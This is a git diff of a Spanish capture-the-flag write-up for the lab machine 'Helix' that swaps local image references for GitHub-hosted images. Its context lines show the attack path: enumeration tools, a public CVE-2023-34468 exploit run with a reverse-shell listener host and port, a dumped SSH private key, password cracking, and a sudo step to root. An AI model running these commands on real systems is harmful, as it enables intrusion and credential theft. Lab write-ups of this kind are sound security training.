@@ -18,8 +18,8 @@ bash
 
 nmap -sS \--open -sC -sV -n -Pn 10.129.245.123
 
-![](media/image1.png){width="11.793055555555556in"
-height="4.219444444444444in"}
+
+<img width="1769" height="633" alt="image" src="https://github.com/user-attachments/assets/3aa5ecf8-f3e4-4037-b7dc-65ee5698bb99" />
 
 Recomendaciones:
 
@@ -48,8 +48,8 @@ bash
 
 whatweb http://helix.htb/
 
-![](media/image2.png){width="13.911968503937008in"
-height="5.623902012248469in"}
+<img width="2082" height="842" alt="image" src="https://github.com/user-attachments/assets/6a62adeb-6e25-4995-b8e9-f52f9872ed01" />
+
 
 Recomendaciones:
 
@@ -67,8 +67,8 @@ interacción. Sin embargo, no se observó ningún elemento relevante con el
 que se pudiera interactuar de forma directa, por lo que esta fase se
 limitó a una revisión visual y funcional básica del contenido expuesto.
 
-![](media/image3.png){width="15.125168416447943in"
-height="9.588101487314086in"}
+<img width="2268" height="1438" alt="image" src="https://github.com/user-attachments/assets/37f403c3-c85c-467c-893d-8913e5e52e2f" />
+
 
 Recomendaciones:
 
@@ -103,11 +103,9 @@ ffuf -u http://helix.htb/ -H \"Host: FUZZ.helix.htb\" -w
 /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs
 154
 
-![](media/image4.png){width="9.136805555555556in"
-height="4.886111111111111in"}
+<img width="1371" height="733" alt="image" src="https://github.com/user-attachments/assets/d7399804-35c7-45d3-b464-f2a21fa0494a" />
 
-![](media/image5.png){width="10.654094488188976in"
-height="6.464879702537183in"}
+<img width="1595" height="968" alt="image" src="https://github.com/user-attachments/assets/2da546b3-46ec-4b43-853b-1949f2b85e66" />
 
 Recomendaciones:
 
@@ -125,8 +123,8 @@ disponibles y determinar la versión de la tecnología utilizada. Esta
 fase ayudó a ampliar la enumeración y a definir mejor las posibles vías
 de ataque.
 
-![](media/image6.png){width="11.57895341207349in"
-height="5.55403324584427in"}
+<img width="1731" height="830" alt="image" src="https://github.com/user-attachments/assets/2ececbc0-09a8-41a5-83c2-b207edadb54b" />
+
 
 Recomendaciones:
 
@@ -150,8 +148,8 @@ bash
 
 katana -u http://flow.helix.htb/nifi/ -jc -kf all -d 10
 
-![](media/image7.png){width="12.209695975503061in"
-height="5.856580271216098in"}
+<img width="1828" height="877" alt="image" src="https://github.com/user-attachments/assets/d5af2325-40ce-403b-b61a-d79bc38eeb26" />
+
 
 Recomendaciones:
 
@@ -189,11 +187,11 @@ set RHOSTS 10.129.227.225
 
 run
 
-![](media/image8.png){width="7.386111111111111in"
-height="4.104861111111111in"}
+<img width="1108" height="616" alt="image" src="https://github.com/user-attachments/assets/9584396e-cbe4-401f-bf5a-2da01a2684d2" />
 
-![](media/image9.png){width="12.24292104111986in"
-height="5.872516404199475in"}
+
+<img width="1834" height="880" alt="image" src="https://github.com/user-attachments/assets/5913585b-11d0-4a0f-963e-3a629b0a2528" />
+
 
 Recomendaciones:
 
@@ -213,8 +211,8 @@ superficie de ataque quedaba limitada al subdominio analizado. Ante esta
 situación, se optó por probar un exploit público de GitHub, que
 finalmente permitió obtener acceso interactivo al sistema.
 
-![](media/image10.png){width="10.033849518810149in"
-height="4.812899168853893in"}
+
+<img width="1501" height="720" alt="image" src="https://github.com/user-attachments/assets/ce1340dc-ab9d-4454-b254-a0cbf11b0bf2" />
 
 Comando usado:
 
@@ -223,10 +221,10 @@ bash
 python3 CVE-2023-34468_poc.py \--target http://flow.helix.htb \--lhost
 10.10.14.54 \--lport 4444 --cleanup
 
-![](media/image11.png){width="11.302027559055118in"
-height="5.4225623359580055in"}
+<img width="1684" height="808" alt="image" src="https://github.com/user-attachments/assets/e60a5bad-2c9f-4d32-b694-135908a7f1ef" />
 
-![](media/image12.png){width="10.69375in" height="5.294117454068242in"}
+<img width="1604" height="794" alt="image" src="https://github.com/user-attachments/assets/ba7d16ff-eecf-484d-98cf-94afb0858c7f" />
+
 
 Recomendaciones:
 
@@ -260,8 +258,9 @@ id
 
 script /dev/null
 
-![](media/image13.png){width="11.72830927384077in"
-height="6.863279746281715in"}
+
+<img width="1758" height="1029" alt="image" src="https://github.com/user-attachments/assets/36dc014e-5a95-4fe1-9a76-3f24837a3e83" />
+
 
 Recomendaciones:
 
@@ -296,8 +295,7 @@ cd support-bundles
 
 ls
 
-![](media/image14.png){width="11.123630796150481in"
-height="3.0352941819772528in"}
+<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/a21cea39-79cf-4569-80ce-3b44d7e689c4" />
 
 Recomendaciones:
 
@@ -331,8 +329,7 @@ bash
 
 \-\-\-\--END OPENSSH PRIVATE KEY\-\-\-\--
 
-![](media/image15.png){width="10.136674321959754in"
-height="4.541176727909011in"}
+<img width="1520" height="681" alt="image" src="https://github.com/user-attachments/assets/fcfc8b5c-e012-4dd9-9450-afd91c5b06e5" />
 
 Recomendaciones:
 
@@ -362,8 +359,8 @@ bash
 
 ssh -i operator.key operator@10.129.245.123
 
-![](media/image16.png){width="13.724820647419072in"
-height="6.583334426946632in"}
+<img width="2057" height="986" alt="image" src="https://github.com/user-attachments/assets/4a335df3-de7d-419f-908f-ce625d829462" />
+
 
 Recomendaciones:
 
@@ -407,8 +404,8 @@ Control\\ \\&\\ Safety\\ Guide.pdf\" ./Guia_Helix.pdf
 scp -i operator.key operator@10.129.245.123:\"/home/operator/control\\
 systems\\ diagram.png\" ./Diagrama_Helix.png
 
-![](media/image17.png){width="9.709722222222222in"
-height="3.5527777777777776in"}
+<img width="1456" height="533" alt="image" src="https://github.com/user-attachments/assets/1296f4b4-315b-4f9d-b16b-51a01ab4ae7d" />
+
 
 Recomendaciones:
 
@@ -441,8 +438,8 @@ cat hash_pdf.txt
 john \--wordlist=/usr/share/wordlists/rockyou.txt \--encoding=ISO-8859-1
 hash_pdf.txt
 
-![](media/image18.png){width="9.615972222222222in"
-height="2.8652777777777776in"}
+<img width="1442" height="430" alt="image" src="https://github.com/user-attachments/assets/d493b011-8e62-46e4-8a3c-71908620c324" />
+
 
 Recomendaciones:
 
@@ -469,11 +466,10 @@ circunstancia sugería que podían aportar contexto sobre la arquitectura
 del sistema o sobre su operación interna, más que credenciales
 directamente reutilizables.
 
-![](media/image19.png){width="7.543055555555555in"
-height="5.125694444444444in"}
+<img width="1131" height="769" alt="image" src="https://github.com/user-attachments/assets/f22387c2-c3e1-44d8-8c69-51b38913eb8a" />
 
-![](media/image20.png){width="8.965418853893263in"
-height="6.462904636920385in"}
+<img width="1343" height="968" alt="image" src="https://github.com/user-attachments/assets/a4d1345b-8649-40f6-9f30-222b07162ce8" />
+
 
 Recomendaciones:
 
@@ -520,8 +516,7 @@ sudo /usr/local/sbin/helix-maint-console
 
 cat /root/root.txt
 
-![](media/image21.png){width="13.939583333333333in"
-height="4.521527777777778in"}
+<img width="2091" height="678" alt="image" src="https://github.com/user-attachments/assets/9dac7b9f-484d-4cb4-90ef-a5ed02a8b531" />
 
 Recomendaciones:
 
